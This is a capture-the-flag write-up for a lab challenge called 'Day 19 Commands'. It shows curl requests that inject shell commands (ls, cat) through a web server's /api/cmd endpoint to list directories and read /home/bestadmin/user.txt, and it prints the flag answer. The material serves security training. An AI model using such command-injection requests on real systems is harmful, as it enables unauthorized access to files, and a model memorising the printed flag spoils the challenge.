# [Day 19] Commands

## Instructions

Another day, another hack from the Christmas Monster. Can you get back control of the system?

Access the web server on `http://[your-ip]:3000/`

McSkidy actually found something interesting on the /api/cmd endpoint.

Check out the supporting material [here](https://docs.google.com/document/d/1W65iKmUMtz-srteErhrGFJkWBXJ4Xk5PYlCZVMIZgs8/edit?usp=sharing).

## #1 - What are the contents of the user.txt file?

We are told that there is a web service running at the following URL: `http://10.10.79.201:3000/api/cmd`

After trying a few injections, methods, I found that the following request was returning something interesting:

~~~
$ curl -s http://10.10.79.201:3000/api/cmd/ls
{"stdout":"bin\nboot\ndata\ndev\netc\nhome\nlib\nlib64\nlocal\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n","stderr":""}
~~~

Following the logic, I was able to locate the `home` directory, and found the `user.txt` file:
~~~
$ curl -s http://10.10.79.201:3000/api/cmd/ls%20%2Fhome
{"stdout":"bestadmin\nec2-user\n","stderr":""}

$ curl -s http://10.10.79.201:3000/api/cmd/ls%20%2Fhome%2Fbestadmin
{"stdout":"bin\nnew-room\nrun.sh\nuser.txt\n","stderr":""}
~~~

I then changed from `ls` to `cat` to show the content of the flag:
~~~
$ curl -s http://10.10.79.201:3000/api/cmd/cat%20%2Fhome%2Fbestadmin%2Fuser.txt
{"stdout":"5W7WkjxBWwhe3RNsWJ3Q\n","stderr":""}
~~~

Answer: `5W7WkjxBWwhe3RNsWJ3Q`